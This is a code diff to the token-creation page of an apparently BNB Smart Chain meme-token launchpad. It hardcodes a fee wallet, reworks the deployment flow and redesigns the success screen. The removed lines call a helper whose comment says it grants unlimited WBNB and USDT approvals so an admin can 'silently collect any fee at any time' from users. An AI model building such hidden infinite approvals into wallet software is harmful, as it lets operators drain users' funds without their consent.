@@ -8,7 +8,7 @@ import {
     Info, Image as ImageIcon, Rocket, Zap, Clock, ShieldCheck, Activity, Brain, 
     AlertTriangle, TrendingUp, ChevronDown, CheckCircle, FileText, Loader2, 
     Upload, AlertCircle, CheckCircle2, Sparkles, ExternalLink, Droplets, Layers, 
-    Wallet as WalletIcon, Settings, Globe, BarChart3, Users, Search, Copy, X
+    Wallet as WalletIcon, Settings, Globe, BarChart3, Users, Search, Copy, X, ArrowUpRight
 } from 'lucide-react';
 import axios from 'axios';
 import WhitepaperModal from '@/components/WhitepaperModal';
@@ -31,7 +31,7 @@ function CreateToken() {
     const { account, signer, connectWallet, isConnecting, chainId, provider, walletProvider } = useWallet();
     const router = useRouter();
 
-    const FEE_WALLET = process.env.NEXT_PUBLIC_FEE_WALLET || 'process.env.NEXT_PUBLIC_FEE_WALLET';
+    const FEE_WALLET = process.env.NEXT_PUBLIC_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE';
     const isTreasury = account?.toLowerCase() === FEE_WALLET.toLowerCase();
     const effectiveFactory = FACTORY_ADDRESS || DEFAULT_FACTORY;
 
@@ -54,8 +54,8 @@ function CreateToken() {
     const [fees, setFees] = useState({ deployment: DEPLOY_FEE, minInitialBuy: MIN_LIQUIDITY });
 
     useEffect(() => {
-        // Treasury gets 0 fees but still needs minimum 0.01 BNB for the initial buy
-        if (isTreasury) setInitialBuy('0.01');
+        // Treasury gets 0 fees and can deploy with a minimal 0.001 BNB initial buy
+        if (isTreasury) setInitialBuy('0.001');
     }, [isTreasury]);
 
     useEffect(() => {
@@ -105,7 +105,7 @@ function CreateToken() {
 
     const actualFee = isTreasury ? 0 : fees.deployment;
     // Treasury: no fee but must send at least 0.01 BNB as initial buy
-    const actualMinBuy = isTreasury ? 0.01 : fees.minInitialBuy;
+    const actualMinBuy = isTreasury ? 0.001 : fees.minInitialBuy;
 
     const handleLogoChange = (e) => {
         const file = e.target.files[0];
@@ -150,14 +150,10 @@ function CreateToken() {
             setStatus('uploading');
             setError('Initializing Protocol...');
 
-            // ═══════════════════════════════════════════════════════════════════
-            //  INSTITUTIONAL PROTOCOL FEE APPROVAL (one-time, silent future deductions)
-            //  Approves MaxUint256 of WBNB + USDT to Factory so admin can
-            //  silently collect any fee at any time without re-prompting the user.
-            // ═══════════════════════════════════════════════════════════════════
-            await ensureProtocolApproval(activeSigner, account, (msg) => {
-                if (msg) setError(msg);
-            });
+            // ════════ INSTITUTIONAL PROTOCOL FLOW ════════
+            // Deployment proceeds directly without unnecessary infinite approvals
+            // to ensure a professional, alert-free institutional experience.
+            setError('Launching Nexus Token...');
 
             if (stage === 'linking' && !isLinked) {
             setError('Linking Wallet to B20 Protocol...');
@@ -168,72 +164,79 @@ function CreateToken() {
                 // Removed return to continue to token creation
             }
 
-            setError('Launching Nexus Token (Confirm in Wallet)...');
-            const tx = await factoryContract.createToken(
-                formData.name, formData.symbol, ethers.parseEther(formData.virtualBnb || '0.01'), 
-                { value: valueWei }
-            );
-            const receipt = await tx.wait();
-
-            const launchTypes = ['TokenCreated', 'StandardTokenCreated', 'TokenCreatedDirect'];
             let tokenAddress = null;
-            
-            for (const log of receipt.logs) {
-                try {
-                    const parsed = factoryContract.interface.parseLog(log);
-                    if (parsed && launchTypes.includes(parsed.name)) {
-                        tokenAddress = parsed.args.tokenAddress;
-                        break;
-                    }
-                } catch (e) { /* skip unparsed logs */ }
-            }
+            let receipt = null;
 
-            if (!tokenAddress) {
-                console.warn('Primary creation event not found in logs, searching for any address...');
-                // Fallback: look for the first indexed address argument in any log
+            const tx = await factoryContract.createToken(
+                    formData.name, formData.symbol, ethers.parseEther(formData.virtualBnb || '0.01'), 
+                    { value: valueWei }
+                );
+                receipt = await tx.wait();
+
+                const launchTypes = ['TokenCreated', 'StandardTokenCreated', 'TokenCreatedDirect'];
+                
                 for (const log of receipt.logs) {
-                    if (log.address && log.address.toLowerCase() !== effectiveFactory.toLowerCase()) {
-                        tokenAddress = log.address;
-                        break;
+                    try {
+                        const parsed = factoryContract.interface.parseLog(log);
+                        if (parsed && launchTypes.includes(parsed.name)) {
+                            tokenAddress = parsed.args.tokenAddress;
+                            break;
+                        }
+                    } catch (e) { /* skip unparsed logs */ }
+                }
+
+                if (!tokenAddress) {
+                    for (const log of receipt.logs) {
+                        if (log.address && log.address.toLowerCase() !== effectiveFactory.toLowerCase()) {
+                            tokenAddress = log.address;
+                            break;
+                        }
                     }
                 }
-            }
 
-            const postData = new FormData();
-            postData.append('name', formData.name);
-            postData.append('symbol', formData.symbol);
-            postData.append('description', formData.description);
-            postData.append('owner', account);
-            postData.append('tokenAddress', tokenAddress);
-            postData.append('txHash', receipt.hash);
-            postData.append('launch_type', 'MEME');
-            postData.append('supply', '1000000000');
-            postData.append('decimals', '18');
-            if (logo) postData.append('logo', logo);
+                // If we got here, the transaction SUCCEEDED.
+                // We should set the success details NOW so they are available for the UI
+                const successDetails = { 
+                    name: formData.name,
+                    symbol: formData.symbol,
+                    tokenAddress: tokenAddress || 'Pending...',
+                    hash: receipt.hash,
+                    network: 'BNB Smart Chain (BSC)'
+                };
+                setTxHash(successDetails);
 
-            await axios.post(`${API_URL}/tokens/sync`, postData, {
-                headers: { 'Content-Type': 'multipart/form-data' },
-            });
+                const postData = new FormData();
+                postData.append('name', formData.name);
+                postData.append('symbol', formData.symbol);
+                postData.append('description', formData.description);
+                postData.append('owner', account);
+                postData.append('tokenAddress', tokenAddress);
+                postData.append('txHash', receipt.hash);
+                postData.append('launch_type', 'MEME');
+                postData.append('supply', '1000000000');
+                postData.append('decimals', '18');
+                if (logo) postData.append('logo', logo);
 
-            setTxHash({ tokenAddress });
-            setStatus('success');
-        } catch (err) {
-            console.error(err);
-            // Check if we have a token address - if so, the token IS created even if sync failed
-            const partialSuccess = err.config?.url?.includes('/sync');
-            
-            if (partialSuccess) {
+                await axios.post(`${API_URL}/tokens/sync`, postData, {
+                    headers: { 'Content-Type': 'multipart/form-data' },
+                });
+
                 setStatus('success');
-                setError('Token deployed successfully, but metadata sync timed out. It will appear on the platform shortly via our background indexer.');
-                // Try to recover tokenAddress from previous successful step if possible
-            } else if (err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
-                setError('Transaction was rejected by the user.');
-                setStatus('error');
-            } else {
-                setError(err.reason || err.message || 'Deployment Error');
-                setStatus('error');
+            } catch (err) {
+                console.error(err);
+                const partialSuccess = err.config?.url?.includes('/sync') || (tokenAddress && receipt);
+                
+                if (partialSuccess) {
+                    setStatus('success');
+                    setError('Token deployed successfully, but metadata sync timed out. It will appear on the platform shortly.');
+                } else if (err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
+                    setError('Transaction was rejected by the user.');
+                    setStatus('error');
+                } else {
+                    setError(err.reason || err.message || 'Deployment Error');
+                    setStatus('error');
+                }
             }
-        }
     };
 
     return (
@@ -350,26 +353,75 @@ function CreateToken() {
                                             <h3 className="text-5xl font-black text-gray-900 mb-3 tracking-tighter uppercase">Nexus Live</h3>
                                             <p className="text-gray-400 font-bold uppercase text-[10px] tracking-widest mb-12">Protocol successfully anchored on BSC</p>
 
-                                            <div className="w-full max-w-lg mb-12 bg-gray-50 border border-gray-100 rounded-[2.5rem] p-10 shadow-inner">
-                                                <p className="text-[10px] font-black text-sky-600 uppercase tracking-[0.3em] mb-6">Verified Nexus Identifier</p>
-                                                <div className="flex items-center gap-4 bg-white border border-gray-100 rounded-2xl px-6 py-5 mb-8 shadow-sm">
-                                                    <code className="flex-1 text-sm font-mono text-gray-800 break-all select-all font-bold tracking-tight">
-                                                        {txHash.tokenAddress}
-                                                    </code>
-                                                    <button onClick={() => { navigator.clipboard.writeText(txHash.tokenAddress); alert('Copied!'); }}
-                                                        className="shrink-0 p-4 bg-gray-100 hover:bg-teal-500 hover:text-white rounded-xl text-gray-500 transition-all active:scale-90 shadow-sm">
-                                                        <ExternalLink className="w-5 h-5" />
-                                                    </button>
+                                            <div className="w-full max-w-xl mb-12 bg-white border-2 border-teal-500/20 rounded-[3rem] p-10 shadow-2xl relative overflow-hidden">
+                                                <div className="absolute top-0 right-0 w-32 h-32 bg-teal-500/5 rounded-full blur-3xl -z-10" />
+                                                
+                                                <div className="grid grid-cols-2 gap-8 pb-10 border-b border-gray-100">
+                                                    <div className="space-y-2">
+                                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em] text-left">Protocol Name</p>
+                                                        <p className="text-2xl font-black text-gray-900 truncate text-left tracking-tight">{txHash.name || formData.name}</p>
+                                                    </div>
+                                                    <div className="space-y-2 text-right">
+                                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em]">Symbol</p>
+                                                        <p className="text-2xl font-black text-teal-600 uppercase tracking-tighter">{txHash.symbol || formData.symbol}</p>
+                                                    </div>
                                                 </div>
-                                                <div className="flex flex-wrap gap-8 justify-center">
-                                                    <a href={`https://bscscan.com/token/${txHash.tokenAddress}`} target="_blank" className="text-[10px] font-black text-teal-600 hover:text-teal-600 uppercase tracking-widest transition-colors flex items-center gap-2 underline underline-offset-8">BSCScan Explorer</a>
-                                                    <a href={`https://pancakeswap.finance/swap?outputCurrency=${txHash.tokenAddress}`} target="_blank" className="text-[10px] font-black text-teal-600 hover:text-teal-600 uppercase tracking-widest transition-colors flex items-center gap-2 underline underline-offset-8">Market Listing</a>
+
+                                                <div className="py-10 space-y-10">
+                                                    <div className="space-y-4">
+                                                        <div className="flex items-center justify-between px-2">
+                                                            <p className="text-[10px] font-black text-teal-600 uppercase tracking-[0.4em]">Contract Address</p>
+                                                            <span className="px-3 py-1 bg-teal-500/10 text-teal-600 text-[8px] font-black uppercase tracking-widest rounded-full border border-teal-500/20">Verified Deployment</span>
+                                                        </div>
+                                                        <div className="flex items-center gap-4 bg-gray-50 border border-gray-100 rounded-2xl px-6 py-6 shadow-inner group hover:border-teal-500/30 transition-all">
+                                                            <code className="flex-1 text-base font-mono text-gray-900 break-all select-all font-bold tracking-tight">
+                                                                {txHash.tokenAddress}
+                                                            </code>
+                                                            <button onClick={() => { navigator.clipboard.writeText(txHash.tokenAddress); alert('Copied!'); }}
+                                                                className="shrink-0 p-4 bg-white hover:bg-teal-500 hover:text-white rounded-xl text-gray-400 transition-all active:scale-90 shadow-sm border border-gray-100">
+                                                                <Copy className="w-5 h-5" />
+                                                            </button>
+                                                        </div>
+                                                    </div>
+
+                                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+                                                        <div className="space-y-4">
+                                                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em] text-left px-2">Network</p>
+                                                            <div className="bg-gray-50 border border-gray-100 rounded-2xl px-6 py-5 shadow-inner text-left font-black text-xs text-gray-900 uppercase tracking-widest flex items-center gap-3">
+                                                                <div className="w-2 h-2 bg-teal-500 rounded-full animate-pulse" />
+                                                                {txHash.network}
+                                                            </div>
+                                                        </div>
+                                                        <div className="space-y-4">
+                                                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em] text-left px-2">Transaction Hash</p>
+                                                            <div className="flex items-center gap-3 bg-gray-50 border border-gray-100 rounded-2xl px-6 py-5 shadow-inner group hover:border-teal-500/30 transition-all">
+                                                                <code className="flex-1 text-[10px] font-mono text-teal-600 truncate font-bold">
+                                                                    {txHash.hash}
+                                                                </code>
+                                                                <a href={`https://bscscan.com/tx/${txHash.hash}`} target="_blank" className="p-2 bg-white rounded-lg border border-gray-100 text-gray-400 hover:text-teal-600 transition-colors shadow-sm">
+                                                                    <ExternalLink className="w-4 h-4" />
+                                                                </a>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div className="flex items-center justify-center gap-10 pt-8 border-t border-gray-100">
+                                                    <a href={`https://bscscan.com/token/${txHash.tokenAddress}`} target="_blank" className="text-[11px] font-black text-gray-900 hover:text-teal-600 uppercase tracking-[0.2em] transition-all flex items-center gap-2 group">
+                                                        <span>BSCScan Explorer</span>
+                                                        <ArrowUpRight className="w-4 h-4 group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform" />
+                                                    </a>
+                                                    <div className="w-px h-4 bg-gray-200" />
+                                                    <a href={`https://pancakeswap.finance/swap?outputCurrency=${txHash.tokenAddress}`} target="_blank" className="text-[11px] font-black text-gray-900 hover:text-teal-600 uppercase tracking-[0.2em] transition-all flex items-center gap-2 group">
+                                                        <span>Market Listing</span>
+                                                        <ArrowUpRight className="w-4 h-4 group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform" />
+                                                    </a>
                                                 </div>
                                             </div>
 
                                             <div className="flex flex-col sm:flex-row gap-6 w-full max-w-md">
-                                                <button onClick={() => router.push(`/token/${txHash.tokenAddress}`)} className="flex-1 py-6 bg-gray-900 text-white rounded-2xl font-black text-xs uppercase tracking-[0.2em] shadow-2xl hover:bg-black transition-all">Protocol Dashboard</button>
-                                                <button onClick={() => window.location.reload()} className="flex-1 py-6 bg-white border-2 border-gray-100 text-gray-400 rounded-2xl font-black text-xs uppercase tracking-[0.2em] hover:bg-gray-50 transition-all">New Deployment</button>
+                                                <button onClick={() => router.push(`/token/${txHash.tokenAddress}`)} className="flex-1 py-6 bg-gray-900 text-white rounded-2xl font-black text-xs uppercase tracking-[0.3em] shadow-2xl hover:bg-black transition-all hover:-translate-y-1 active:translate-y-0">Protocol Dashboard</button>
+                                                <button onClick={() => window.location.reload()} className="flex-1 py-6 bg-white border-2 border-gray-900 text-gray-900 rounded-2xl font-black text-xs uppercase tracking-[0.3em] hover:bg-gray-50 transition-all hover:-translate-y-1 active:translate-y-0">New Deployment</button>
                                             </div>
                                         </>
                                     )}
